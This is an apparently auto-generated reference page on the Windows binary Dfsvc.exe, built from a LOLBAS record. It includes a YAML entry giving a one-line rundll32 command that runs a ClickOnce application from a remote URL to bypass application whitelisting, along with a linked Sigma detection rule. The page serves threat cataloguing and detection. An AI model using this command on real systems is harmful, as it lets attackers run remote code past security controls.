---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Dfsvc.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `dfsvc.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Dfsvc.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Dfsvc.exe](../../tools/windows/dfsvc.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | dfsvc.exe |
| name | Dfsvc.exe |
| type | tool |
| source | lolbas |
| url | https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
Author: Oddvar Moe
Commands:
- Category: AWL Bypass
  Command: rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
  Description: Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)
  MitreID: T1127.002
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: ClickOnce
  - Execute: Remote
  Usecase: Use binary to bypass Application whitelisting
Created: 2018-05-25
Description: ClickOnce engine in Windows used by .NET
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
Full_Path:
- Path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe
- Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe
- Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe
Name: Dfsvc.exe
Resources:
- Link: https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
- Link: https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Dfsvc.yml
```

## Detection / Analysis Notes

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
```
